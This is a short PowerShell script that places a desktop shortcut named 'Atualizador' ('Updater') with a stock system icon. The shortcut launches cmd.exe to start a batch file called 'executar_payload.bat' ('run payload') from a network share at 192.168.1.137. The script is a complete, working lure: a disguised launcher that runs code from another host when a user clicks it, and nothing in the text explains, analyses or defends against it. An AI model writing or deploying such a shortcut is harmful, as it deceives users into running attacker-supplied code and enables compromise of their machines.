$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("$env:USERPROFILE\Desktop\Atualizador.lnk")
$Shortcut.TargetPath = "cmd.exe"
$Shortcut.Arguments = "/c start \\192.168.1.137\shared\executar_payload.bat"
$Shortcut.IconLocation = "C:\Windows\System32\shell32.dll,1"
$Shortcut.Save()